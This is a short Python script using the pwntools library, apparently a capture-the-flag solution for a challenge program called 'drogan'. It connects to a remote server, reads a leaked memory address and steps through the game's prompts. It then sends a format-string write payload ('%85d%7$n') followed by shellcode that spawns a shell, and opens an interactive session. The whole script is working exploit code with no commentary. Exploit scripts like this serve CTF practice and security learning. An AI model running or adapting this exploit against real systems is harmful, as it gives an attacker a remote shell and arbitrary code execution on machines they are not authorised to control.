from pwn import *

#r=process('./drogan')

r=remote('111.198.29.45',32884)

context(arch='amd64', os='linux', log_level='debug')

r.recvuntil("secret[0] is ")

addr=int(r.recvuntil("\n")[:-1],16)

r.recvline("What should your character's name be:")

r.sendline("fish")

r.recvline("So, where you will go?east or up?:")

r.sendline("east")

r.recvline("go into there(1), or leave(0)?:")

r.sendline("1")

r.recvline("'Give me an address'")

r.sendline(str(addr))

r.recvline("And, you wish is:")

r.sendline("%85d%7$n")

shellcode = asm(shellcraft.sh())

r.sendlineafter("USE YOU SPELL", shellcode)

r.interactive()
